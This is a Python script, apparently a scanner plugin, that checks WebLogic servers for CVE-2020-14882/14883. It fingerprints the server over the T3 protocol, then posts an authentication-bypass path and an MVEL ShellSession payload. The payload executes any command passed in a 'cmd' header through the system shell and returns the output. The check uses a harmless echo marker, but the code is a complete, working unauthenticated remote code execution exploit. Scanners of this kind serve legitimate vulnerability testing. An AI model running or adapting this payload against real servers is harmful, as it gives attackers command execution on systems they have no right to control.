import requests
import urllib, re
import socket, time
from urllib.parse import urlparse
import http.client
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

def weblogic_fingerprint(url):          # weblogic版本指纹
    oH = urlparse(url)
    a = oH.netloc.split(':')
    port = 80
    if 2 == len(a):
        port = a[1]
    elif 'https' in oH.scheme:
        port = 443
    host = a[0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    server_address = (str(host), int(port))
    sock.connect(server_address)
    sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
    time.sleep(1)
    try:
        version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
        if version:
            return True
        else:
            return False
    except:
        return False

def verify(url):
    relsult = {
        'name': 'Weblogic未授权远程命令执行漏洞(CVE-2020-14882&CVE-2020-14883)',
        'vulnerable': False
    }
    cmd = 'echo "excvasqweqqwqwaasasdasdasd"'
    path = "/console/css/%252e%252e%252fconsole.portal"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                  'application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'cmd': cmd
    }
    payload = ('_nfpb=true&_pageLabel=&handle='
              'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
              '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
              'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
              '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
              '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
              'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
              'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
              '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
              '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
              '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
              'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
              'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
              'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
    try:
        if weblogic_fingerprint(url) is not True:
            return relsult
        vulurl = urllib.parse.urljoin(url, path)
        req = requests.post(vulurl, data=payload, headers=headers, timeout=5, verify=False)
        if re.search('excvasqweqqwqwaasasdasdasd', req.text) and re.search('echo', req.text) is not True:
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'http://www.javashuo.com/article/p-glmljccr-oa.html, https://www.cnblogs.com/liliyuanshangcao/p/13962160.html'

        return relsult
    except:
        return relsult




